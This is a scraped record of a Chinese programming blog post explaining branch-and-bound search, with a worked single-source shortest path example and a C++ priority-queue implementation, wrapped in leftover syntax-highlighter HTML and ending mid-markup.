class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Redis,分布式,数据库", "url": "http://blog.jobbole.com/114050/", "url_obj_id": "ab6b90e6a2bac7d584de17cc2fd8106c"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/6093f32a122633db22eb695f0d6cb461.jpg"], "title": "分支限界法", "create_date": "2018/06/04 ·", "praise_num": 1, "fav_num": 1, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/chinazhangjie/archive/2010/11/01/1866136.html\">独酌逸醉</a>   </div><h1>分支限界法与回溯法</h1>\n<p><b></b>（1）求解目标：回溯法的求解目标是找出解空间树中满足约束条件的所有解，而分支限界法的求解目标则是找出满足约束条件的一个解，或是在满足约束条件的解中找出在某种意义下的最优解。 （2）搜索方式的不同：回溯法以深度优先的方式搜索解空间树，而分支限界法则以广度优先或以最小耗费优先的方式搜索解空间树。</p>\n<h2 style=\"font-weight: 400\">分支限界法的基本思想</h2>\n<p>分支限界法常以广度优先或以最小耗费（最大效益）优先的方式搜索问题的解空间树。在分支限界法中，每一个活结点只有一次机会成为扩展结点。活结点一旦成为扩展结点，就一次性产生其所有儿子结点。在这些儿子结点中，导致不可行解或导致非最优解的儿子结点被舍弃，其余儿子结点被加入活结点表中。 此后，从活结点表中取下一结点成为当前扩展结点，并重复上述结点扩展过程。这个过程一直持续到找到所需的解或活结点表为空时为止。</p>\n<h2 style=\"font-weight: 400\">常见的两种分支限界法</h2>\n<p>（1）队列式(FIFO)分支限界法    按照队列先进先出（FIFO）原则选取下一个结点为扩展结点。 （2）优先队列式分支限界法    按照优先队列中规定的优先级选取优先级最高的结点成为当前扩展结点。<b></b></p>\n<h1>一、单源最短路径问题</h1>\n<h2>1、问题描述</h2>\n<p style=\"font-weight: 400\">在下图所给的有向图G中，每一边都有一个非负边权。要求图G的从源顶点s到目标顶点t之间的最短路径。</p>\n<p style=\"font-weight: 400\"><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/6093f32a122633db22eb695f0d6cb461.jpg\"><img class=\"aligncenter size-full wp-image-114063\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/6093f32a122633db22eb695f0d6cb461.jpg\" alt=\"2010110113034430\"></a></p>\n<p style=\"font-weight: 400\">下图是用优先队列式分支限界法解有向图<span lang=\"EN-US\">G</span>的单源最短路径问题产生的解空间树。其中，每一个结点旁边的数字表示该结点所对应的当前路长。</p>\n<p style=\"font-weight: 400\"><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/77cfd39c9d0ea8433c2ae9b4e50130df.jpg\"><img class=\"aligncenter size-full wp-image-114064\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/77cfd39c9d0ea8433c2ae9b4e50130df.jpg\" alt=\"2010110113034430\"></a></p>\n<p style=\"font-weight: 400\">找到一条路径：</p>\n<p style=\"font-weight: 400\"><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/26006811f2b270ce7fbf6bb8d6a7f5cb.jpg\"><img class=\"aligncenter size-full wp-image-114065\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/26006811f2b270ce7fbf6bb8d6a7f5cb.jpg\" alt=\"2010110113034430\"></a></p>\n<p style=\"font-weight: 400\">目前的最短路径是8，一旦发现某个结点的下界不小于这个最短路进，则剪枝：</p>\n<p style=\"font-weight: 400\"><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/8a10881e817ae003d441b09052dbfc88.jpg\"><img class=\"aligncenter size-full wp-image-114066\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/8a10881e817ae003d441b09052dbfc88.jpg\" alt=\"2010110113034430\"></a></p>\n<p style=\"font-weight: 400\">同一个结点选择最短的到达路径：</p>\n<p style=\"font-weight: 400\"><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/211efb0a33ee496e04ff356a40d26072.jpg\"><img class=\"aligncenter size-full wp-image-114067\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/211efb0a33ee496e04ff356a40d26072.jpg\" alt=\"2010110113034430\"></a></p>\n<p style=\"font-weight: 400\"><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/37c8ccc43f73ac92e67232329c02b319.jpg\"><img class=\"aligncenter size-full wp-image-114068\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/37c8ccc43f73ac92e67232329c02b319.jpg\" alt=\"2010110113034430\"></a></p>\n<h2>2.剪枝策略</h2>\n<p>在算法扩展结点的过程中，一旦发现一个结点的下界不小于当前找到的最短路长，则算法剪去以该结点为根的子树。</p>\n<p>在算法中，利用结点间的控制关系进行剪枝。从源顶点s出发，2条不同路径到达图G的同一顶点。由于两条路径的路长不同，因此可以将路长长的路径所对应的树中的结点为根的子树剪去。</p>\n<h2>3.算法思想</h2>\n<p>解单源最短路径问题的优先队列式分支限界法用一极小堆来存储活结点表。其优先级是结点所对应的当前路长。</p>\n<p>算法从图G的源顶点s和空优先队列开始。结点s被扩展后，它的儿子结点被依次插入堆中。此后，算法从堆中取出具有最小当前路长的结点作为当前扩展结点，并依次检查与当前扩展结点相邻的所有顶点。如果从当前扩展结点i到顶点j有边可达，且从源出发，途经顶点i再到顶点j的所相应的路径的长度小于当前最优路径长度，则将该顶点作为活结点插入到活结点优先队列中。这个结点的扩展过程一直继续到活结点优先队列为空时为止。</p>\n<h1>实现</h1>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a935ca7a84983046531\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n2.剪枝策略在算法扩展结点的过程中，一旦发现一个结点的下界不小于当前找到的最短路长，则算法剪去以该结点为根的子树。   在算法中，利用结点间的控制关系进行剪枝。从源顶点s出发，2条不同路径到达图G的同一顶点。由于两条路径的路长不同，因此可以将路长长的路径所对应的树中的结点为根的子树剪去。 3.算法思想解单源最短路径问题的优先队列式分支限界法用一极小堆来存储活结点表。其优先级是结点所对应的当前路长。算法从图G的源顶点s和空优先队列开始。结点s被扩展后，它的儿子结点被依次插入堆中。此后，算法从堆中取出具有最小当前路长的结点作为当前扩展结点，并依次检查与当前扩展结点相邻的所有顶点。如果从当前扩展结点i到顶点j有边可达，且从源出发，途经顶点i再到顶点j的所相应的路径的长度小于当前最优路径长度，则将该顶点作为活结点插入到活结点优先队列中。这个结点的扩展过程一直继续到活结点优先队列为空时为止。实现/* 主题：单源最短路径问题\r\n* 作者：chinazhangjie\r\n* 邮箱：chinajiezhang@gmail.com\r\n* 开发语言：C++\r\n* 开发环境：Mircosoft Virsual Studio 2008\r\n* 时间: 2010.11.01\r\n*/\r\n\r\n#include &lt;iostream&gt;\r\n#include &lt;vector&gt;\r\n#include &lt;queue&gt;\r\n#include &lt;limits&gt;\r\nusing namespace std;\r\n\r\nstruct node_info\r\n{\r\npublic:\r\n    node_info (int i,int w) \r\n        : index (i), weight (w) {}\r\n    node_info () \r\n        : index(0),weight(0) {}\r\n    node_info (const node_info &amp; ni) \r\n        : index (ni.index), weight (ni.weight) {}\r\n\r\n    friend \r\n    bool operator &lt; (const node_info&amp; lth,const node_info&amp; rth) {\r\n        return lth.weight &gt; rth.weight ; // 为了实现从小到大的顺序\r\n    }\r\n\r\npublic:\r\n    int index; // 结点位置\r\n    int weight; // 权值\r\n};\r\n\r\nstruct path_info \r\n{\r\npublic:\r\n    path_info ()\r\n        : front_index(0), weight (numeric_limits&lt;int&gt;::max()) {}\r\n\r\npublic:\r\n    int front_index;\r\n    int weight;\r\n};\r\n\r\n// single source shortest paths\r\nclass ss_shortest_paths\r\n{\r\n     \r\npublic:\r\n    ss_shortest_paths (const vector&lt;vector&lt;int&gt; &gt;&amp; g,int end_location) \r\n        :no_edge (-1), end_node (end_location), node_count (g.size()) , graph (g) \r\n    {}\r\n\r\n    // 打印最短路径\r\n    void print_spaths () const {\r\n        cout &lt;&lt; \"min weight : \" &lt;&lt; shortest_path &lt;&lt; endl;\r\n        cout &lt;&lt; \"path: \" ;\r\n        copy (s_path_index.rbegin(),s_path_index.rend(),\r\n            ostream_iterator&lt;int&gt; (cout, \" \"));\r\n        cout &lt;&lt; endl;\r\n    }\r\n\r\n    // 求最短路径\r\n    void shortest_paths () {\r\n        vector&lt;path_info&gt; path(node_count);\r\n        priority_queue&lt;node_info,vector&lt;node_info&gt; &gt; min_heap;\r\n        min_heap.push (node_info(0,0));    // 将起始结点入队\r\n\r\n        while (true) {\r\n            node_info top = min_heap.top ();    // 取出最大值\r\n            min_heap.pop ();\r\n\r\n            // 已到达目的结点\r\n            if (top.index == end_node) {\r\n                break ;\r\n            }\r\n            // 未到达则遍历\r\n            for (int i = 0; i &lt; node_count; ++ i) {\r\n                // 顶点top.index和i间有边，且此路径长小于原先从原点到i的路径长 \r\n                if (graph[top.index][i] != no_edge &amp;&amp; \r\n                    (top.weight + graph[top.index][i]) &lt; path[i].weight) {\r\n                    min_heap.push (node_info (i,top.weight + graph[top.index][i]));\r\n                    path[i].front_index = top.index;\r\n                    path[i].weight = top.weight + graph[top.index][i];\r\n                }\r\n            }\r\n            if (min_heap.empty()) {\r\n                break ;\r\n            }\r\n        }\r\n\r\n        shortest_path = path[end_node].weight;\r\n        int index = end_node;\r\n        s_path_index.push_back(index) ;\r\n        while (true) {\r\n            index = path[index].front_index ;\r\n            s_path_index.push_back(index);\r\n            if (index == 0) {\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\nprivate:\r\n    vector&lt;vector&lt;int&gt; &gt;    graph ;            // 图的数组表示\r\n    int                        node_count;        // 结点个数\r\n    const int                no_edge;        // 无通路\r\n    const int                end_node;        // 目的结点\r\n    vector&lt;int&gt;                s_path_index;    // 最短路径\r\n    int                        shortest_path;    // 最短路径\r\n};\r\n\r\nint main()\r\n{\r\n    const int size = 11; \r\n    vector&lt;vector&lt;int&gt; &gt; graph (size);\r\n    for (int i = 0;i &lt; size; ++ i) {\r\n        graph[i].resize (size);\r\n    }\r\n    for (int i = 0;i &lt; size; ++ i) {\r\n        for (int j = 0;j &lt; size; ++ j) {\r\n            graph[i][j] = -1;\r\n        }\r\n    }\r\n    graph[0][1] = 2;\r\n    graph[0][2] = 3;\r\n    graph[0][3] = 4;\r\n    graph[1][2] = 3;\r\n    graph[1][5] = 2;\r\n    graph[1][4] = 7;\r\n    graph[2][5] = 9;\r\n    graph[2][6] = 2;\r\n    graph[3][6] = 2;\r\n    graph[4][7] = 3;\r\n    graph[4][8] = 3;\r\n    graph[5][6] = 1;\r\n    graph[5][8] = 3;\r\n    graph[6][9] = 1;\r\n    graph[6][8] = 5;\r\n    graph[7][10] = 3;\r\n    graph[8][10] = 2;\r\n    graph[9][8] = 2;\r\n    graph[9][10] = 2;\r\n\r\n    ss_shortest_paths ssp (graph, 10);\r\n    ssp.shortest_paths ();\r\n    ssp.print_spaths ();\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-74\">74</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-75\">75</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-76\">76</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-77\">77</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-78\">78</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-79\">79</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-80\">80</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-81\">81</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-82\">82</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-83\">83</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-84\">84</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-85\">85</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-86\">86</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-87\">87</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-88\">88</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-89\">89</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-90\">90</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-91\">91</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-92\">92</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-93\">93</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-94\">94</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-95\">95</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-96\">96</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-97\">97</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-98\">98</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-99\">99</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-100\">100</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-101\">101</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-102\">102</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-103\">103</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-104\">104</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-105\">105</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-106\">106</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-107\">107</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-108\">108</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-109\">109</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-110\">110</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-111\">111</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-112\">112</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-113\">113</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-114\">114</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-115\">115</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-116\">116</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-117\">117</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-118\">118</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-119\">119</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-120\">120</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-121\">121</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-122\">122</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-123\">123</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-124\">124</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-125\">125</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-126\">126</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-127\">127</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-128\">128</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-129\">129</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-130\">130</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-131\">131</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-132\">132</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-133\">133</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-134\">134</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-135\">135</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-136\">136</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-137\">137</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-138\">138</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-139\">139</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-140\">140</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-141\">141</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-142\">142</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-143\">143</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-144\">144</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-145\">145</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-146\">146</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-147\">147</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-148\">148</div><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a84983046531-149\">149</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a84983046531-150\">150</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-1\"><span class=\"crayon-cn\">2.</span>剪枝策略在算法扩展结点的过程中，一旦发现一个结点的下界不小于当前找到的最短路长，则算法剪去以该结点为根的子树。<span class=\"crayon-h\">   </span>在算法中，利用结点间的控制关系进行剪枝。从源顶点<span class=\"crayon-i\">s</span>出发，<span class=\"crayon-cn\">2</span>条不同路径到达图<span class=\"crayon-i\">G</span>的同一顶点。由于两条路径的路长不同，因此可以将路长长的路径所对应的树中的结点为根的子树剪去。<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.</span>算法思想解单源最短路径问题的优先队列式分支限界法用一极小堆来存储活结点表。其优先级是结点所对应的当前路长。算法从图<span class=\"crayon-i\">G</span>的源顶点<span class=\"crayon-i\">s</span>和空优先队列开始。结点<span class=\"crayon-i\">s</span>被扩展后，它的儿子结点被依次插入堆中。此后，算法从堆中取出具有最小当前路长的结点作为当前扩展结点，并依次检查与当前扩展结点相邻的所有顶点。如果从当前扩展结点<span class=\"crayon-i\">i</span>到顶点<span class=\"crayon-i\">j</span>有边可达，且从源出发，途经顶点<span class=\"crayon-i\">i</span>再到顶点<span class=\"crayon-i\">j</span>的所相应的路径的长度小于当前最优路径长度，则将该顶点作为活结点插入到活结点优先队列中。这个结点的扩展过程一直继续到活结点优先队列为空时为止。实现<span class=\"crayon-c\">/* 主题：单源最短路径问题</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-2\"><span class=\"crayon-c\">* 作者：chinazhangjie</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-3\"><span class=\"crayon-c\">* 邮箱：chinajiezhang@gmail.com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-4\"><span class=\"crayon-c\">* 开发语言：C++</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-5\"><span class=\"crayon-c\">* 开发环境：Mircosoft Virsual Studio 2008</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-6\"><span class=\"crayon-c\">* 时间: 2010.11.01</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-7\"><span class=\"crayon-c\">*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-8\"> </div><div class=\"crayon-line\" 